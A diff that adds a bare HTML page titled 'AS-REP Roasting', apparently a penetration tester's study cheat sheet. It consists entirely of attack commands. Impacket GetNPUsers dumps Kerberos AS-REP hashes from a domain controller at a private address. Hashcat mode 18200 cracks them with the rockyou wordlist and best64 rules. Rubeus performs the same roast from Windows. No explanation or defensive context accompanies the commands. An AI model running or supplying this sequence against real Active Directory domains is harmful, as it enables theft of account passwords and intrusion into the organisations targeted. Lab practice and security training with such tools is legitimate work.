@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>AS-REP Roasting</title>
+</head><body>impacket-GetNPUsers -dc-ip 192.168.50.70 &nbsp;-request -outputfile hashes.asreproast falana.com/armaan<br/>
+<br/>
+hashcat --help | grep -i "Kerberos"<br/>
+<br/>
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force<br/>
+<br/>
+.\Rubeus.exe asreproast /nowrap<br/>
+<br/>
+</body></html>
